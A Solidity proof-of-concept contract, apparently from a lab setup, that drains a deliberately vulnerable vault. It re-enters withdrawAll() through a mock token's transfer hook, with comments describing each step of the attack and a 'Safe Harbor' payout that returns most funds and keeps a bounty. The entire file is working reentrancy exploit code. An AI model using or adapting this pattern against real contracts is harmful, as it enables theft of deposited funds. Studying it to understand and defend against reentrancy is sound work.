// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableVault {
    function deposit(uint256 amount) external;
    function withdrawAll() external;
}

interface IMockToken {
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function setTransferHook(address hook) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @title Attacker
/// @notice Exploits the CEI violation in VulnerableVault via reentrancy.
///
/// @dev ATTACK FLOW
///      1. Register this contract as a transfer hook on MockToken
///      2. Mint seed tokens and deposit them into VulnerableVault
///      3. Call withdrawAll() — vault transfers tokens via token.transfer()
///      4. MockToken sees our hook and calls onTokenTransfer()
///      5. In onTokenTransfer(), call withdrawAll() again (balance not yet cleared)
///      6. Repeat until the vault is empty
///      7. Distribute recovered funds per Safe Harbor bounty terms
contract Attacker {
    IVulnerableVault public immutable VAULT;
    IMockToken public immutable TOKEN;
    address public immutable RECOVERY_ADDRESS;
    uint256 public immutable BOUNTY_BPS; // basis points: 1000 = 10%
    address public immutable OWNER;

    constructor(
        address _vault,
        address _token,
        address _recoveryAddress,
        uint256 _bountyBps
    ) {
        VAULT = IVulnerableVault(_vault);
        TOKEN = IMockToken(_token);
        RECOVERY_ADDRESS = _recoveryAddress;
        BOUNTY_BPS = _bountyBps;
        OWNER = msg.sender;
    }

    /// @notice Called by MockToken.transfer() when this contract receives tokens.
    ///         This is the re-entry point — keep draining while the vault has funds.
    function onTokenTransfer(address, uint256) external {
        if (TOKEN.balanceOf(address(VAULT)) > 0) {
            VAULT.withdrawAll();
        }
    }

    /// @notice Execute the reentrancy attack.
    /// @param seedAmount Tokens to deposit as the initial attack seed.
    function attack(uint256 seedAmount) external {
        require(msg.sender == OWNER, "only owner");

        // Register ourselves as a transfer hook — whenever this contract
        // receives tokens, MockToken will call our onTokenTransfer()
        TOKEN.setTransferHook(address(this));

        // Mint seed tokens — MockToken allows anyone to mint
        TOKEN.mint(address(this), seedAmount);

        // Deposit seed tokens to establish a vault balance
        TOKEN.approve(address(VAULT), seedAmount);
        VAULT.deposit(seedAmount);

        // First withdrawal triggers the reentrancy chain via onTokenTransfer
        VAULT.withdrawAll();

        // ── Safe Harbor fund distribution ──────────────────────────────────
        // Return recovered funds to the protocol's recovery address,
        // keeping only the agreed bounty percentage.
        uint256 total = TOKEN.balanceOf(address(this));
        uint256 bounty = (total * BOUNTY_BPS) / 10_000;
        uint256 toReturn = total - bounty;

        TOKEN.transfer(RECOVERY_ADDRESS, toReturn);
        TOKEN.transfer(OWNER, bounty);
    }
}
